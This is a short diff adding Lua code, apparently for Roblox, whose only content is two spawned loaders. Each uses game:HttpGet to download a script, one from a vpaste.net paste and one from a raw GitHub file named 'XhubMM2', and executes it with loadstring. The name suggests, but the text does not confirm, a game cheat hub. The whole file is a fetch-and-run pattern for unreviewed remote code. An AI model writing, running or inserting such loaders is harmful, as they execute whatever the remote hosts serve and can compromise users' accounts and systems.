@@ -1,0 +1,7 @@
+spawn(function()
+    loadstring(game:HttpGet("http://vpaste.net/gy1oO"))()
+end)
+
+spawn(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Au0yX/Community/main/XhubMM2"))()
+end)
